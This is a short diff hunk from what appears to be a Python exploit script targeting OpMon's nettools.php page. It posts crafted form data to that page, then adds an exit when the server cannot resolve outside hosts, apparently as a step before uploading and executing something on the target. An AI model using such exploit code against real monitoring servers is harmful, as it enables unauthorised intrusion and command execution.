@@ -63,6 +63,7 @@ def upload():
 	req1 = requests.post(SRV+"/opmon/nettools/nettools.php", cookies=cookies, data=p1, verify=False)
 	if "Failed to resolve" in req1.text:
 		print("[!] The server not have external connections")
+		sys.exit()
 
 def execute():
 	cookies = {'services_limit':'100'}
